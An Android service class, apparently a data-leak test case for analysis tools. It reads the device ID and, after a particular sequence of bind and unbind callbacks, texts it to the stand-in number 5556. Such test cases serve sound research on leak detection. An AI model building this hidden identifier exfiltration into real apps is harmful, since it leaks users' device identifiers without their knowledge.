package edu.uta;

import java.util.Random;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class ServiceEventSequence2 extends Service {

    private final IBinder mBinder = new LocalBinder();
    private final Random mGenerator = new Random();
    private String d1= "";
    private String d2 = "";
    private String d3 = "";


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
		this.d1 = tMgr.getDeviceId();
		
        return Service.START_NOT_STICKY;
    }

    public class LocalBinder extends Binder {
        ServiceEventSequence2 getService() {
            return ServiceEventSequence2.this;
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        this.d2 = this.d1;
        
        if(!d3.isEmpty())
        	SmsManager.getDefault().sendTextMessage("5556", null, d3, null, null);
		
//        Toast.makeText(getApplicationContext(), "BOUND", Toast.LENGTH_SHORT).show();
        return mBinder;
    }
    
    @Override
    public boolean onUnbind(Intent intent) {
    	this.d3 = this.d2;
        return false;
    }
    
    @Override
    public void onRebind(Intent intent) {
    	this.d3 = "";

    }

}
